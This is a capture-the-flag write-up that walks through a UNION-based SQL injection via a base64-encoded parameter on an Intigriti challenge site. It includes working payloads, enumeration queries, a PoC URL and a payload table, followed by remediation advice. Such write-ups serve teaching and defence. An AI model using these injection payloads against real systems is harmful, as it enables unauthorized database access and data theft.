# Intigriti September 2026 CTF — Write-up: SQL Injection via Base64-Encoded Parameter

> **Challenge:** Intigriti Challenge 0926 (by [khanhdlq](https://x.com/khanhdlq))
> **Target:** `https://challenge-0926.challenges.intigriti.io`
> **Flag:** `INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}`
> **Vulnerability:** SQL Injection (CWE-89)

---

## TL;DR

The challenge page is a "Critter Gallery" that displays animals based on a `pic` GET parameter. The parameter's value is **base64-encoded on the client and decoded server-side directly into a SQL query** without any sanitization. Base64 is an *encoding*, not a security control — so decoding our own SQLi payloads before submission gives us a clean, unauthenticated, UNION-based SQL injection with full read access to the database, where a hidden `secret_vault` table holds the flag.

```
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N  (High)
```

---

## 1. Reconnaissance

The landing page frames the challenge rules and embeds the actual target in an iframe pointing to `/challenge.php`:

```html
<iframe src="/challenge.php" width="100%" height="800px"></iframe>
```

Response headers already tell us the stack:

```
X-Powered-By: PHP/8.2.33
Server: istio-envoy
```
<img width="1147" height="255" alt="image" src="https://github.com/user-attachments/assets/69248b66-4438-49c5-8a7b-6bcb5b930bff" />

PHP 8.2 on the server side, fronted by an Istio service mesh (a Kubernetes-style deployment — worth remembering later, as it rules out some exploitation paths).

`/challenge.php` renders a grid of animal tiles. Each tile links to a detail page with a suspicious-looking parameter:

```html
<a class="tile" href="?pic=Zm94">      <!-- fox      -->
<a class="tile" href="?pic=cGFuZGE=">  <!-- panda    -->
<a class="tile" href="?pic=bGlvbg==">  <!-- lion     -->
```

`Zm94` base64-decodes to `fox`, `cGFuZGE=` to `panda`. So the flow is clear:
<img width="1915" height="982" alt="image" src="https://github.com/user-attachments/assets/2e079fdf-98c7-481b-8f3c-0bb189532ec4" />


1. Client picks an animal and base64-encodes its name into `pic`.
2. Server decodes `pic` and looks the name up in a database.
3. The matching animal's description is rendered into the page.

**Key observation:** if the server concatenates the *decoded* value into SQL, we control the query — base64 is just a speed bump. We simply encode our payloads ourselves.

---

## 2. Confirming the Injection

First, a baseline. An unknown-but-quoted value (`foxx`) returns a friendly "not found" state:

```html
<div class="desc empty">No critter goes by that name yet.</div>
```

Now the classic boolean test — payload `' OR 1=1-- -`, sent base64-encoded:

```
GET /challenge.php?pic=JyBPUiAxPTEtLSAt
```

```sql
-- value after server-side base64 decode:
SELECT ... WHERE name = '' OR 1=1-- -'
```

The response contains **every animal's description concatenated together** instead of one:

```html
<div class="desc">
  The red fox is a clever, highly adaptable hunter.<br>
  Giant pandas spend most of the day munching bamboo.<br>
  Lions are the only truly social of the big cats.<br>
  ...all eight critters...
</div>
```
<img width="1918" height="995" alt="image" src="https://github.com/user-attachments/assets/d529bb2a-a644-4a9f-ac9e-4005178fa9da" />


The OR condition matched every row. **SQL injection confirmed** — and notably, the injected value is also reflected in the page as the `<h2>` heading, and PHP's `htmlspecialchars()` escapes it (`'` becomes `&#039;`), so output is HTML-safe — this is purely a server-side SQL issue, not an XSS one.

---

## 3. Mapping the Query

**Column count via ORDER BY:**

| Payload (decoded) | Result |
|---|---|
| `' ORDER BY 1-- -` | Normal "not found" page |
| `' ORDER BY 2-- -` | Empty response (SQL error — column doesn't exist) |

One column it is. (The error is silently swallowed — the page just returns nothing — but the behavioral difference is a reliable oracle.)

**UNION validation** — if the query has one column, a one-column UNION should flow straight into the page:

```
payload: ' UNION SELECT 'UNION_WORKS'-- -
b64:    JyBVTklPTiBTRUxFQ1QgJ1VOSU9OX1dPUktTJy0tIC0=
```

Response:

```html
<div class="desc">UNION_WORKS</div>
```

The injected `SELECT` is rendered verbatim. We now have a direct data-exfiltration primitive: **whatever we `SELECT` lands in the `desc` div.**

---

## 4. Database Enumeration

With a working UNION, enumeration is mechanical.

**Current database:**

```sql
' UNION SELECT database()-- -
```
```html
<div class="desc">critter_gallery</div>
```

**Tables** (restricting to the current schema to keep the output clean):

```sql
' UNION SELECT GROUP_CONCAT(table_name)
  FROM information_schema.tables
  WHERE table_schema=database()-- -
```
```html
<div class="desc">animals,secret_vault</div>
```

There's the twist: alongside the expected `animals` table sits a **`secret_vault`** the gallery never mentions.

**Columns:**

```sql
' UNION SELECT GROUP_CONCAT(column_name)
  FROM information_schema.columns
  WHERE table_schema=database()-- -
```
```html
<div class="desc">id,name,description,id,note</div>
```

Mapping them out (via `GROUP_CONCAT(table_name,':',column_name)`) gives:

| Table | Columns |
|---|---|
| `animals` | `id`, `name`, `description` |
| `secret_vault` | `id`, `note` |

---

## 5. Capturing the Flag

`secret_vault.note` looks like exactly what we're after:

```sql
' UNION SELECT GROUP_CONCAT(note) FROM secret_vault-- -
```
<img width="1898" height="984" alt="image" src="https://github.com/user-attachments/assets/1353dc10-e0c2-41d4-bde6-467d4cf769e8" />

One last request — and the flag drops straight into the gallery card:

```html
<div class="desc">INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}</div>
```

**Ready-to-use PoC URL** (base64 of the final payload):

```
https://challenge-0926.challenges.intigriti.io/challenge.php?pic=JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKG5vdGUpIEZST00gc2VjcmV0X3ZhdWx0LS0gLQ==
```
<img width="1916" height="989" alt="image" src="https://github.com/user-attachments/assets/fd8ee85f-24e7-4ff9-bfcf-23ce877cff8a" />

---

## 6. Payload Reference

All payloads are passed as `pic=<base64>`; the table shows both forms.

| Step | Payload (decoded) | Base64 |
|---|---|---|
| Boolean confirm | `' OR 1=1-- -` | `JyBPUiAxPTEtLSAt` |
| Column count | `' ORDER BY 2-- -` (errors) | `JyBPUkRFUiBCWSAyLS0gLQ==` |
| UNION check | `' UNION SELECT 'UNION_WORKS'-- -` | `JyBVTklPTiBTRUxFQ1QgJ1VOSU9OV09SS1MnLS0gLQ==` |
| DB name | `' UNION SELECT database()-- -` | `JyBVTklPTiBTRUxFQ1QgZGF0YWJhc2UoKS0tIC0=` |
| Tables | `' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -` | `JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKHRhYmxlX25hbWUpIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBXSEVSRSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKS0tIC0=` |
| Columns | `' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database()-- -` | `JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKGNvbHVtbl9uYW1lKSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIFdIRVJFIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpLS0gLQ==` |
| **Flag** | `' UNION SELECT GROUP_CONCAT(note) FROM secret_vault-- -` | `JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKG5vdGUpIEZST00gc2VjcmV0X3ZhdWx0LS0gLQ==` |

---

## 7. Root Cause Analysis

The vulnerable pattern is effectively:

```php
$name = base64_decode($_GET['pic']);          // attacker-controlled
$sql  = "SELECT ... FROM animals WHERE name = '$name'";  // string concatenation
```

Two compounding mistakes:

1. **String-concatenated SQL.** The decoded value is interpolated into the query instead of being passed as a bound parameter.
2. **Security-through-encoding.** Base64 was (presumably) used to make URLs tidy or to obfuscate the lookup — but it provides zero security value. It's deterministic, reversible, and doesn't validate anything.

The one thing done *right*: output encoding. The reflected value goes through `htmlspecialchars()`, which is why the `<h2>` reflection never becomes an XSS. But output encoding can't help you when the injection happens *before* the database — garbage in, garbage queried.

---

## 8. Remediation

**Primary fix — parameterized queries:**

```php
$name = base64_decode($_GET['pic'] ?? '');

$stmt = $pdo->prepare('SELECT description FROM animals WHERE name = ?');
$stmt->execute([$name]);
```

The driver sends the value as data, never as SQL — the entire injection class disappears.

**Defense in depth:**

- **Allow-list validation.** The valid inputs are eight known animal names; validate against them (`in_array($name, $allowed, true)`) before touching the database. For a lookup-by-name feature, strict input validation is trivial and airtight.
- **Least-privilege DB user.** The application account needs `SELECT` on `animals` — nothing more. It should not be able to read `information_schema` metadata broadly, and certainly not `secret_vault`. Segregating secrets into a table the app user can't reach would have contained this bug to the gallery data.
- **Don't leak stack details.** `X-Powered-By: PHP/8.2.33` hands an attacker free fingerprinting for a known-vulnerability lookup.
- **Handle errors gracefully.** The silent empty response on SQL errors was actually a decent instinct (no error text leaked) — but a generic error page with server-side logging would be more correct, and wouldn't have mattered anyway since UNION extraction needs no error channel.

---

## 9. Severity

```
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N
```

- **AV:N / AC:L / AT:N / PR:N / UI:N** — remotely exploitable by any unauthenticated visitor with one crafted GET request; no preconditions.
- **VC:H** — full read access to every table in the database, including the `secret_vault` flag store.
- **VI/VA:N** — the PoC is read-only (`UNION SELECT`); no modification or availability impact demonstrated.

**Why not RCE?** The natural follow-up — `SELECT ... INTO OUTFILE` to drop a webshell — requires the DB user to hold the `FILE` privilege, a permissive `secure_file_priv`, and a shared filesystem between database and web server. The `istio-envoy` deployment strongly suggests the database runs in a separate container, so a file write would land on the DB's filesystem, not the webroot. Scoring reflects the demonstrated PoC, per the challenge triage standard.

---

## 10. Solution Summary

1. Recon: gallery tiles pass base64 animal names via `?pic=`; headers reveal PHP 8.2 behind an Istio mesh.
2. Hypothesis: `pic` is base64-decoded server-side and concatenated into a name-lookup SQL query.
3. Confirm: `' OR 1=1-- -` (self-encoded) returns every animal at once — injection proven.
4. Map: `ORDER BY 2` errors → one column; `UNION SELECT` output renders in the page.
5. Enumerate: database `critter_gallery`; tables `animals` + hidden `secret_vault`; vault has a `note` column.
6. Extract: `UNION SELECT GROUP_CONCAT(note) FROM secret_vault` → **`INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}`**

The whole exploit is four requests and a decoder. The lesson worth keeping: **encoding is not validation** — any value that round-trips through base64 before hitting your SQL layer is still attacker-controlled input, and only parameterization makes it safe.

---

*Thanks to Intigriti for the monthly challenge and to khanhdlq for building it.*
